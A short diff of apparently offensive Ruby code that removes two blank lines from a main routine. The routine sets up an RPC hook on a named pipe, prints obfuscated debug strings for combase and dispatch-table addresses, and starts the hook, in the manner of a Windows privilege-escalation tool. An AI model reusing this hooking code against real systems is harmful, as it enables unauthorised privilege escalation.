@@ -2181,12 +2181,10 @@ def main
 
   begin
     ctx = MyContext.new(pipe_name)
-
     dbg1 obf("[*] base:0x") + ctx.combase_module.to_s(16)
     dbg obf("[*] dt:0x") + ctx.dispatch_table_ptr.to_s(16)
     dbg obf("[*] fn:0x") + ctx.use_protseq_function_ptr.to_s(16)
     dbg obf("[*] pc:") + ctx.use_protseq_param_count.to_s
-
     ctx.hook_rpc
     ctx.start
 
